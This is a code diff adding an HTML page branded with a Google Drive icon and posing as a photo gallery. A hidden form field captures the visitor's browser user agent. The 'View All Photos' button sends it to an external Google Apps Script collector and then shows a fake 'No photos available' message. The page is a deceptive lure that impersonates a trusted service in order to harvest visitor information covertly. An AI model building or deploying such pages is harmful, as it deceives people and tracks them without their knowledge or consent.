@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Agent Information</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOMj8vK1Ek7Zr+0PRuFq7xCjH2E2U4B6pYe4UHI" crossorigin="anonymous">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            text-align: center; /* Center text in the body */
+            background-color: #f0f0f0; /* Light background for the page */
+        }
+        .header {
+            margin-bottom: 20px; /* Space below the header */
+        }
+        .fa-google-drive {
+            font-size: 100px; /* Size of the icon */
+            color: #4285F4; /* Google Drive color */
+        }
+        .image-box {
+            position: relative;
+            width: 300px; /* Set a fixed width for the image box */
+            height: 300px; /* Set a fixed height for the image box */
+            border: 5px solid #007BFF; /* Border around the image box */
+            border-radius: 10px; /* Rounded corners for the image box */
+            overflow: hidden; /* Hide overflow for rounded corners */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); /* Shadow for depth */
+            margin: 0 auto 15px; /* Center the box and add bottom margin */
+            background-color: #f9f9f9; /* Light background color */
+            display: flex; /* Center image inside */
+            justify-content: center; /* Center image horizontally */
+            align-items: center; /* Center image vertically */
+        }
+        .image-box img {
+            width: 100%; /* Image takes full width */
+            height: 100%; /* Image takes full height */
+            object-fit: cover; /* Cover the entire area of the image */
+            transition: transform 0.5s; /* Smooth scaling */
+        }
+        .image-box:hover img {
+            transform: scale(1.1); /* Slight zoom on hover */
+        }
+        /* Hide the user agent form */
+        #userAgent {
+            display: none; /* Makes the input field invisible */
+        }
+        #submitBtn {
+            padding: 10px 20px; /* Add padding to the button */
+            font-size: 16px; /* Increase font size */
+            color: white; /* Text color */
+            background-color: #007BFF; /* Button background color */
+            border: none; /* Remove border */
+            border-radius: 5px; /* Rounded corners */
+            cursor: pointer; /* Pointer cursor on hover */
+            transition: background-color 0.3s; /* Smooth background color transition */
+        }
+        #submitBtn:hover {
+            background-color: #0056b3; /* Darker background color on hover */
+        }
+        /* Loading spinner styles */
+        .loader {
+            border: 8px solid #f3f3f3; /* Light grey background */
+            border-top: 8px solid #3498db; /* Blue top */
+            border-radius: 50%; /* Rounded edges */
+            width: 50px; /* Spinner size */
+            height: 50px; /* Spinner size */
+            animation: spin 1s linear infinite; /* Animation */
+            position: absolute; /* Position in the center */
+            top: 50%; /* Center vertically */
+            left: 50%; /* Center horizontally */
+            transform: translate(-50%, -50%); /* Adjust position */
+            display: none; /* Hide by default */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Popup styles */
+        .popup {
+            display: none; /* Hide popup by default */
+            position: fixed; /* Fixed position */
+            left: 50%; /* Center horizontally */
+            top: 50%; /* Center vertically */
+            transform: translate(-50%, -50%); /* Adjust position */
+            padding: 20px; /* Padding around text */
+            background-color: white; /* White background */
+            border: 2px solid #007BFF; /* Border color */
+            border-radius: 10px; /* Rounded corners */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); /* Shadow for depth */
+            z-index: 1000; /* On top of other elements */
+        }
+        .popup .close {
+            cursor: pointer; /* Pointer cursor for close button */
+            color: #007BFF; /* Close button color */
+            font-weight: bold; /* Bold text */
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <!-- Google Drive Icon using Font Awesome -->
+        <i class="fab fa-google-drive"></i> <!-- Font Awesome Google Drive Icon -->
+    </div>
+    <form id="userAgentForm">
+        <input type="text" id="userAgent" name="userAgent" readonly>
+    </form>
+    <div class="image-box" id="imageBox">
+        <img src="https://raw.githubusercontent.com/username/repository/branch/path/to/image.jpg" alt="Gallery Image"> <!-- Replace with your actual image URL -->
+    </div>
+    <button id="submitBtn">View All Photos</button>
+    <div class="loader" id="loader"></div> <!-- Loading spinner -->
+    <div class="popup" id="popup">
+        <p>No photos available.</p>
+        <span class="close" id="closePopup">Close</span>
+    </div> <!-- Popup message -->
+
+    <script>
+        document.getElementById('userAgent').value = navigator.userAgent;
+
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            var formData = new FormData(document.getElementById('userAgentForm'));
+            var loader = document.getElementById('loader');
+            loader.style.display = 'block'; // Show the loading spinner
+            fetch('https://script.google.com/macros/s/AKfycbw8jjy6iBiilaBC1QN1fEAhsQvBlNsSc8eq2mN7T9FzjBrORKohp9rT2Oa_jJOC9lPj/exec', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Handle success response
+                loader.style.display = 'none'; // Hide the loading spinner
+                showPopup(); // Show popup message
+            })
+            .catch(error => {
+                console.error('Error:', error); // Handle error response
+                loader.style.display = 'none'; // Hide the loading spinner
+                alert('Error sending data!'); // Alert for error
+            });
+        });
+
+        function showPopup() {
+            var popup = document.getElementById('popup');
+            popup.style.display = 'block'; // Show the popup
+        }
+
+        document.getElementById('closePopup').addEventListener('click', function() {
+            var popup = document.getElementById('popup');
+            popup.style.display = 'none'; // Hide the popup when closed
+        });
+    </script>
+</body>
+</html>
